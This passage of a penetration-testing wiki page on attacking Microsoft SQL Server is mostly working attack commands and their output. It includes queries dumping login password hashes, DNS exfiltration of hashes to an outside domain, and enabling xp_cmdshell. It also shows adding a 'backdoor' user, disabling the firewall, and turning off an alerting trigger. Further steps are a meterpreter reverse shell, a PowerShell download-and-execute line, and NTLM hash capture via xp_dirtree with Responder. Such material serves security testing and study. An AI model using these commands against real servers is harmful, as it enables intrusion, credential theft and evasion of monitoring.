        <p>SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
          -- priv, mssql 2000. Need to convert to hex to return hashes in MSSQL error
          message / some version of query analyzer.</p>
        <p>SELECT name, password_hash FROM master.sys.sql_logins -- priv, mssql 2005;</p>
        <p>SELECT name + &apos;-&apos; + master.sys.fn_varbintohexstr(password_hash)
          from master.sys.sql_logins -- priv, mssql 2005</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Password Cracker</td>
      <td style="text-align:left">MSSQL 2000 and 2005 Hashes are both SHA1-based.&#x202F;<a href="https://labs.portcullis.co.uk/application/phrasen-drescher/" target="_blank">phrasen|drescher</a>&#x202F;can
        crack these.</td>
    </tr>
    <tr>
      <td style="text-align:left">List Privileges</td>
      <td style="text-align:left">Impossible?</td>
    </tr>
    <tr>
      <td style="text-align:left">List DBA Accounts</td>
      <td style="text-align:left">
        <p>TODO</p>
        <p>SELECT is_srvrolemember(&apos;sysadmin&apos;); --priv</p>
        <p>-- is your account a sysadmin? returns 1 for true, 0 for false, NULL for
          invalid role. Also try &apos;bulkadmin&apos;, &apos;systemadmin&apos; and
          other values from the&#x202F;<a href="http://msdn.microsoft.com/en-us/library/ms176015.aspx" target="_blank">documentation</a>SELECT
          is_srvrolemember(&apos;sysadmin&apos;, &apos;sa&apos;); -- is sa a sysadmin?
          return 1 for true, 0 for false, NULL for invalid role/username.</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Current Database</td>
      <td style="text-align:left">SELECT DB_NAME()</td>
    </tr>
    <tr>
      <td style="text-align:left">List Databases</td>
      <td style="text-align:left">
        <p>SELECT name FROM master..sysdatabases;</p>
        <p>SELECT DB_NAME(N); -- for N = 0, 1, 2, ...</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Columns</td>
      <td style="text-align:left">
        <p>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE
          name = &apos;mytable&apos;); -- for the current DB only</p>
        <p>SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM
          master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id
          AND master..sysobjects.name=&apos;sometable&apos;; -- list colum names
          and types for master..sometable</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Tables</td>
      <td style="text-align:left">
        <p>SELECT name FROM master..sysobjects WHERE xtype = &apos;U&apos;; -- use
          xtype = &apos;V&apos; for views</p>
        <p>SELECT name FROM someotherdb..sysobjects WHERE xtype = &apos;U&apos;;</p>
        <p>SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM
          master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id
          AND master..sysobjects.name=&apos;sometable&apos;; -- list colum names
          and types for master..sometable</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Find Tables From Column Name</td>
      <td style="text-align:left">
        <p>-- NB: This example works only for the current database. If you wan&apos;t
          to search another db, you need to specify the db name (e.g. replace sysobject
          with mydb..sysobjects).</p>
        <p>SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM
          sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype
          = &apos;U&apos; AND syscolumns.name LIKE &apos;%PASSWORD%&apos; -- this
          lists table, column for each column containing the word &apos;password&apos;</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Select Nth Row</td>
      <td style="text-align:left">SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER
        BY name ASC) sq ORDER BY name DESC -- gets 9th row</td>
    </tr>
    <tr>
      <td style="text-align:left">Select Nth Char</td>
      <td style="text-align:left">SELECT substring(&apos;abcd&apos;, 3, 1) -- returns c</td>
    </tr>
    <tr>
      <td style="text-align:left">Bitwise AND</td>
      <td style="text-align:left">
        <p>SELECT 6 &amp; 2 -- returns 2</p>
        <p>SELECT 6 &amp; 1 -- returns 0</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">ASCII Value -&gt; Char</td>
      <td style="text-align:left">SELECT char(0x41) -- returns A</td>
    </tr>
    <tr>
      <td style="text-align:left">Char -&gt; ASCII Value</td>
      <td style="text-align:left">SELECT ascii(&apos;A&apos;) - returns 65</td>
    </tr>
    <tr>
      <td style="text-align:left">Casting</td>
      <td style="text-align:left">
        <p>SELECT CAST(&apos;1&apos; as int);</p>
        <p>SELECT CAST(1 as char)</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">String Concatenation</td>
      <td style="text-align:left">SELECT &apos;A&apos; + &apos;B&apos; - returns AB</td>
    </tr>
    <tr>
      <td style="text-align:left">If Statement</td>
      <td style="text-align:left">IF (1=1) SELECT 1 ELSE SELECT 2 -- returns 1</td>
    </tr>
    <tr>
      <td style="text-align:left">Case Statement</td>
      <td style="text-align:left">SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END -- returns 1</td>
    </tr>
    <tr>
      <td style="text-align:left">Avoiding Quotes</td>
      <td style="text-align:left">SELECT char(65)+char(66) -- returns AB</td>
    </tr>
    <tr>
      <td style="text-align:left">Time Delay</td>
      <td style="text-align:left">WAITFOR DELAY &apos;0:0:5&apos; -- pause for 5 seconds</td>
    </tr>
    <tr>
      <td style="text-align:left">Make DNS Requests</td>
      <td style="text-align:left">
        <p>declare @host varchar(800); select @host = name FROM master..syslogins;
          exec(&apos;master..xp_getfiledetails &apos;&apos;\\&apos; + @host + &apos;\c$\boot.ini&apos;&apos;&apos;);
          -- nonpriv, works on 2000</p>
        <p>declare @host varchar(800); select @host = name + &apos;-&apos; + master.sys.fn_varbintohexstr(password_hash)
          + &apos;.2.pentestmonkey.net&apos; from sys.sql_logins; exec(&apos;xp_fileexist
          &apos;&apos;\\&apos; + @host + &apos;\c$\boot.ini&apos;&apos;&apos;); --
          priv, works on 2005</p>
        <p>-- NB: Concatenation is not allowed in calls to these SPs, hence why we
          have to use @host. Messy but necessary.</p>
        <p>-- Also check out theDNS tunnel feature of&#x202F;<a href="http://sqlninja.sourceforge.net/sqlninja-howto.html" target="_blank">sqlninja</a> 
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Command Execution</td>
      <td style="text-align:left">
        <p>EXEC xp_cmdshell &apos;net user&apos;; -- priv</p>
        <p>On MSSQL 2005 you may need to reactivate xp_cmdshell first as it&apos;s
          disabled by default:</p>
        <p>EXEC sp_configure &apos;show advanced options&apos;, 1; -- priv</p>
        <p>RECONFIGURE; -- priv</p>
        <p>EXEC sp_configure &apos;xp_cmdshell&apos;, 1; -- priv</p>
        <p>RECONFIGURE; -- priv</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Local File Access</td>
      <td style="text-align:left">
        <p>CREATE TABLE mydata (line varchar(8000));</p>
        <p>BULK INSERT mydata FROM &apos;c:\boot.ini&apos;;</p>
        <p>DROP TABLE mydata;</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Hostname, IP Address</td>
      <td style="text-align:left">SELECT HOST_NAME()</td>
    </tr>
    <tr>
      <td style="text-align:left">Create Users</td>
      <td style="text-align:left">EXEC&#x202F;<a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx" target="_blank">sp_addlogin</a>&#x202F;&apos;user&apos;,
        &apos;pass&apos;; -- priv</td>
    </tr>
    <tr>
      <td style="text-align:left">Drop Users</td>
      <td style="text-align:left">EXEC&#x202F;<a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx" target="_blank">sp_droplogin</a>&#x202F;&apos;user&apos;;
        -- priv</td>
    </tr>
    <tr>
      <td style="text-align:left">Make User DBA</td>
      <td style="text-align:left">EXEC&#x202F;<a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx" target="_blank">master.dbo.sp_addsrvrolemember</a>&#x202F;&apos;user&apos;,
        &apos;sysadmin; -- priv</td>
    </tr>
    <tr>
      <td style="text-align:left">Location of DB files</td>
      <td style="text-align:left">TODO</td>
    </tr>
    <tr>
      <td style="text-align:left">Default/System Databases</td>
      <td style="text-align:left">
        <p>northwind</p>
        <p>model</p>
        <p>msdb</p>
        <p>pubs</p>
        <p>tempdb</p>
      </td>
    </tr>
  </tbody>
</table>

<h2 id="mssql-2017-commands">MSSQL 2017 Commands</h2>
<p>Current user&#x2019;s permissions:</p>
<pre><code class="lang-text">SQL&gt; SELECT * FROM fn_my_permissions(NULL, &apos;SERVER&apos;); 
entity_name    subentity_name    permission_name 
------------   ---------------   ------------------ 
server                           CONNECT SQL 
server                           VIEW ANY DATABASE
</code></pre>
<p>Check out the databases available: </p>
<pre><code class="lang-text">SQL&gt; SELECT name FROM master.sys.databases 
name 
----------- 
master 
tempdb 
model 
msdb 
volume
</code></pre>
<p>I can look for user generated tables on those databases: </p>
<pre><code class="lang-text">SQL&gt; use volume 
[*] ENVCHANGE(DATABASE): Old Value: volume, New Value: volume 
[*] INFO(QUERIER): Line 1: Changed database context to &apos;volume&apos;. 
SQL&gt; SELECT name FROM sysobjects WHERE xtype = &apos;U&apos; 
name 
------------
</code></pre>
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">Nmap</h3>
<p>Scan:</p>
<p><code>nmap -sU --script=ms-sql-info 192.168.1.108</code> </p>
<p>Dump hashes: </p>
<p><code>nmap -p1433 --script ms-sql-empty-password,ms-sql-dump-hashes &lt;target&gt;</code> </p>
<p>Execute command: </p>
<p><code>nmap -Pn -n -sS &#x2013;script=ms-sql-xp-cmdshell.nse &lt;victim_ip&gt; -p1433 &#x2013;script-args mssql.username=sa,mssql.password=&lt;sql_password&gt;,ms-sql-xp-cmdshell.cmd=&#x201D;net user backdoor backdoor123 /add&#x201D;</code></p>
<h3 id="metasploit">Metasploit</h3>
<h4 id="find-mssql-servers">Find MSSQL servers:</h4>
<p><code>msf &gt; use auxiliary/scanner/mssql/mssql_ping</code> </p>
<h4 id=""> </h4>
<h4 id="mssqlenum">mssql_enum</h4>
<p>The mssql_enum is an admin module that will accept a set of credentials and query a MSSQL for various configuration settings. </p>
<pre><code class="lang-text">msf auxiliary(mssql_enum) &gt; run 
[*] Running MS SQL Server Enumeration... 
[*] Version: 
[*] Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)  
[*] Oct 14 2005 00:33:37  
[*] Copyright (c) 1988-2005 Microsoft Corporation 
[*] Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2) 
[*] Configuration Parameters: 
[*] C2 Audit Mode is Not Enabled 
[*] xp_cmdshell is Not Enabled 
[*] remote access is Enabled 
[*] allow updates is Not Enabled 
[*] Database Mail XPs is Not Enabled 
[*] Ole Automation Procedures are Not Enabled 
[*] Databases on the server: 
[*] Database name:master 
[*] Database Files for master: 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\mastlog.ldf 
[*] Database name:tempdb 
[*] Database Files for tempdb: 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\templog.ldf 
[*] Database name:model 
[*] Database Files for model: 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\modellog.ldf 
[*] Database name:msdb 
[*] Database Files for msdb: 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBLog.ldf 
[*] System Logins on this Server: 
[*] sa 
[*] ##MS_SQLResourceSigningCertificate## 
[*] ##MS_SQLReplicationSigningCertificate## 
[*] ##MS_SQLAuthenticatorCertificate## 
[*] ##MS_AgentSigningCertificate## 
[*] BUILTIN\Administrators 
[*] NT AUTHORITY\SYSTEM 
[*] V-MAC-XP\SQLServer2005MSSQLUser$V-MAC-XP$SQLEXPRESS 
[*] BUILTIN\Users 
[*] Disabled Accounts: 
[*] No Disabled Logins Found
</code></pre>
<h4 id="mssqlexec">mssql_exec</h4>
<p>The mssql_exec admin module takes advantage of the xp_cmdshell stored procedure to execute commands on the remote system. If you have acquired or guessed MSSQL admin credentials, this can be a very useful module. </p>
<pre><code class="lang-text">msf auxiliary(mssql_exec) &gt; set CMD netsh firewall set opmode disable 
CMD =&gt; netsh firewall set opmode disable 
msf auxiliary(mssql_exec) &gt; set PASSWORD password1 
PASSWORD =&gt; password1 
msf auxiliary(mssql_exec) &gt; set RHOST 192.168.1.195 
RHOST =&gt; 192.168.1.195 
msf auxiliary(mssql_exec) &gt; run 
[*] The server may have xp_cmdshell disabled, trying to enable it... 
[*] SQL Query: EXEC master..xp_cmdshell &apos;netsh firewall set opmode disable&apos; 
 output 
 ------ 
 Ok. 
[*] Auxiliary module execution completed 
msf auxiliary(mssql_exec) &gt;
</code></pre>
<h3 id="powerupsql">PowerUpSQL</h3>
<p>PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server </p>
<p>Link: <a href="https://github.com/NetSPI/PowerUpSQL" target="_blank">https://github.com/NetSPI/PowerUpSQL</a> </p>
<p>Example: </p>
<pre><code class="lang-text">PS /opt/PowerUpSQL&gt; Import-Module .\PowerUpSQL.psd1  
PS /opt/PowerUpSQL&gt; Get-SQLInstanceDomain -Verbose 
VERBOSE: Grabbing SPNs from the domain for SQL Servers (MSSQL*)... 
VERBOSE: 0 SPNs found. 
VERBOSE: Parsing SQL Server instances from SPNs... 
VERBOSE: 0 instances were found.
</code></pre>
<p>Or load into memory</p>
<pre><code class="lang-text">IEX(New-Object System.Net.WebClient).DownloadString(&quot;http://192.168.0.1/PowerUpSQL.ps1&quot;)
</code></pre>
<h4 id="sql-server-discovery-cheats">SQL Server Discovery Cheats</h4>
<table>
  <thead>
    <tr>
      <th style="text-align:left">Description</th>
      <th style="text-align:left">Command</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Discover Local SQL Server Instances</td>
      <td style="text-align:left">Get-SQLInstanceLocal -Verbose</td>
    </tr>
    <tr>
      <td style="text-align:left">Discover Remote SQL Server Instances</td>
      <td style="text-align:left">
        <p>UDP Broadcast Ping</p>
        <p>Get-SQLInstanceBroadcast -Verbose</p>
        <p>UDP Port Scan</p>
        <p>Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1</p>
        <p>Get the instance list from a file</p>
        <p>Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get-SQLInstanceScanUDPThreaded
          -Verbose</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Discover Active Directory Domain SQL Server Instances</td>
      <td style="text-align:left">Get-SQLInstanceDomain -Verbose</td>
    </tr>
    <tr>
      <td style="text-align:left">Discover Active Directory Domain SQL Server Instances using alternative
        domain credentials</td>
      <td style="text-align:left">
        <p>runas /noprofile /netonly /user:domain\user PowerShell.exe</p>
        <p>import-module PowerUpSQL.psd1</p>
        <p>Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username
          domain\user -password P@ssword123</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List SQL Servers using a specific domain account</td>
      <td style="text-align:left">Get-SQLInstanceDomain -Verbose -DomainAccount SQLSvc</td>
    </tr>
    <tr>
      <td style="text-align:left">List shared domain user SQL Server service accounts</td>
      <td style="text-align:left">Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount | Sort-Object
        count -Descending | select Count,Name | Where-Object {($_.name -notlike
        &quot;*$&quot;) -and ($_.count -gt 1) }</td>
    </tr>
  </tbody>
</table>

<p>More commands can be found in the github repo or in the <strong>tool section</strong>.</p>
<h3 id="linked-servers">Linked Servers</h3>
<p>Microsoft SQL Server allows links to be created to external data sources such as other SQL servers, Oracle databases, excel spreadsheets, and so on. Due to common misconfigurations the links, or &#x201C;Linked Servers&#x201D;, can often be exploited to traverse database link networks, gain unauthorized access to data, and deploy shells.</p>
<p>Source: <a href="https://blog.netspi.com/how-to-hack-database-links-in-sql-server/" target="_blank">https://blog.netspi.com/how-to-hack-database-links-in-sql-server/</a></p>
<p>Find linked servers:</p>
<pre><code class="lang-text">SQL&gt; select srvname from sysservers;
srvname
------------------------------   
COMPATIBILITY\POO_CONFIG
COMPATIBILITY\POO_PUBLIC
</code></pre>
<p>Execute commands on the other server:</p>
<pre><code class="lang-text">SQL&gt; EXECUTE (&apos;select @@servername;&apos;) at [COMPATIBILITY\POO_CONFIG];
------------------------------   
COMPATIBILITY\POO_CONFIG
</code></pre>
<h2 id="bruteforce-login">Bruteforce login</h2>
<h3 id="metasploit">Metasploit</h3>
<h4 id="bruteforce-mssql-login">Bruteforce MSSQL Login</h4>
<p><code>msf &gt; use auxiliary/admin/mssql/mssql_login</code> </p>
<h4 id="metasploit-mssql-shell">Metasploit MSSQL Shell</h4>
<pre><code class="lang-text">msf &gt; use exploit/windows/mssql/mssql_payload 
msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</code></pre>
<h3 id="nmap">Nmap</h3>
<pre><code class="lang-text">nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt &lt;host&gt;
</code></pre>
<h2 id="enable-xpcmdshell">Enable xp_cmdshell</h2>
<h3 id="check-if-enabled">Check if enabled</h3>
<p><code>xp_cmdshell whoami</code></p>
<p>Or</p>
<p><code>EXEC xp_cmdshell &apos;net user&apos;; -- priv</code> </p>
<p>Or </p>
<p><code>EXEC master.dbo.xp_cmdshell &apos;cmd&apos;;</code> </p>
<h3 id="enable-xpcmdshell">Enable xp_cmdshell</h3>
<h4 id="short-way">Short way:</h4>
<pre><code class="lang-text">SQL&gt; enable_xp_cmdshell
</code></pre>
<h4 id="long-way">Long way:</h4>
<pre><code class="lang-text">EXEC sp_configure &apos;show advanced options&apos;, 1; -- priv 
RECONFIGURE; -- priv 
EXEC sp_configure &apos;xp_cmdshell&apos;, 1; -- priv 
RECONFIGURE; -- priv 
or 
EXEC sp_configure &apos;show advanced options&apos;, 1; 
EXEC sp_configure reconfigure; 
EXEC sp_configure &apos;xp_cmdshell&apos;, 1; 
EXEC sp_configure reconfigure;
</code></pre>
<h3 id="check-if-it-works">Check if it works</h3>
<p><code>xp_cmdshell &apos;dir C:\&apos;</code> </p>
<h3 id="disable-trigger">Disable Trigger</h3>
<p>If you get a error when we try to enable xp_cmdshell on trigger, such as:</p>
<pre><code class="lang-text">Line 181: The transaction ended in the trigger. The batch has been aborted.
</code></pre>
<p>These triggers are a policy put in place to alert and block attempts to enable and use xp_cmdshell. The problem is, as sa, we can disable these triggers.</p>
<p><code>SQL&gt; disable trigger ALERT_xp_cmdshell on all server</code></p>
<p>And then enable xp_cmdshell</p>
<pre><code class="lang-text">SQL&gt; enable_xp_cmdshell
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option &apos;show advanced options&apos; changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option &apos;xp_cmdshell&apos; changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL&gt; xp_cmdshell whoami
output                                                                             
------------------------------   
nt service\mssql$poo_public                                                        
NULL
</code></pre>
<h2 id="capture-credentials-using-xpdirtree">Capture credentials using xp_dirtree</h2>
<p>Capture credentials using responder and xp_dirtree: </p>
<p>Start Responder: </p>
<p><code>root@kali# responder -I eth0</code> </p>
<p>Issue the connect to load a file using&#x202F;xp_dirtree&#x202F;from an SMB share (that doesn&#x2019;t exist) on our host:</p>
<pre><code class="lang-text">SQL&gt; xp_dirtree &apos;\\10.10.14.14\a&apos;; 
subdirectory    depth
</code></pre>
<p>It doesn&#x2019;t return anything, but in the responder window, I&#x2019;ve captured the necessary information: </p>
<pre><code class="lang-text">[SMBv2] NTLMv2-SSP Client   : 10.10.10.125 
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc 
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:603386f497f
[*] Skipping previously captured hash for QUERIER\mssql-svc
</code></pre>
<h2 id="execueexternalscript">Execue_external_script</h2>
<p>We can use <code>sp_execute_external_scrip</code> to execute external command, </p>
<p><strong>SQL Server 2017</strong> now supports Python as an extensible script engine and we can use it to execute commands:</p>
<pre><code class="lang-text">SQL&gt; EXEC sp_execute_external_script @language =N&apos;Python&apos;, @script = N&apos;import os; os.system(&quot;whoami&quot;);&apos;;
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
compatibility\poo_public01

Express Edition will continue to be enforced.
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="1099-java-rmi.html" class="navigation navigation-prev " aria-label="Previous page: 1099 - Java RMI">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="1521-oracle-db.html" class="navigation navigation-next " aria-label="Next page: 1521 - Oracle DB">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"description":"Microsoft SQL Server is a relational database management system developed by Microsoft.","title":"1433 - Microsoft SQL","level":"2.1.3.23","depth":3,"next":{"title":"1521 - Oracle DB","level":"2.1.3.24","depth":3,"path":"infrastructure-testing/enumeration/services-ports/1521-oracle-db.md","ref":"infrastructure-testing/enumeration/services-ports/1521-oracle-db.md","articles":[]},"previous":{"title":"1099 - Java RMI","level":"2.1.3.22","depth":3,"path":"infrastructure-testing/enumeration/services-ports/1099-java-rmi.md","ref":"infrastructure-testing/enumeration/services-ports/1099-java-rmi.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"infrastructure-testing/enumeration/services-ports/1433-microsoft-sql.md","mtime":"2020-10-31T15:57:45.660Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-11-01T17:33:13.702Z"},"basePath":"../../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../../gitbook/gitbook.js"></script>
    <script src="../../../gitbook/theme.js"></script>
    
        
        <script src="../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

